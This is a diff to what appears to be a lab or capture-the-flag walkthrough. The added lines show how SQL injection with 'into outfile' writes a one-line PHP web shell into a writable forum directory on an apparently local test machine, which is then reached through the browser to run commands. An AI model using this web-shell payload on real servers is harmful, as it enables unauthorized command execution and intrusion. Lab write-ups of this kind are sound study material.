@@ -323,6 +323,16 @@ Very very sad.
 
 The [default document root](https://askubuntu.com/questions/683953/where-is-apache-web-root-directory-on-ubuntu) for Apache is **/var/www/** (before Ubuntu 14.04) or /var/www/html/ (Ubuntu 14.04 and later)
 
-We can use the into outfile command to write to a file.
+We can use the into outfile command to write to a file. Neat [tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/)
+
+Going back to our dirb results, I one by one tried every subdirectory that returned status code 200.
+`forum/templates_c` turned out to be the only one where we have write right.
+
+`select 1, '<?php system($_GET["c"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php'`
 
 ![image](https://github.com/user-attachments/assets/17eb0165-0061-4f1a-aa94-74f9697c3991)
+
+Now if we visit `https://192.168.56.103/forum/templates_c/cmd.php`
+
+![image](https://github.com/user-attachments/assets/2df4be2f-d5e9-4594-bf8a-852a2d1093d5)
+
